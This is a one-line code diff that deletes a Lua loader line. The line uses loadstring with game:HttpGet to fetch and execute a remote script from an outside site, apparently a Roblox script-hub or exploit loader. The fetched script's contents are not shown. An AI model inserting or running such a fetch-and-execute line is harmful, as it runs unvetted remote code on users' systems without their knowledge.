@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://system-exodus.com/scripts/misc-releases/supernatural.lua",true))()
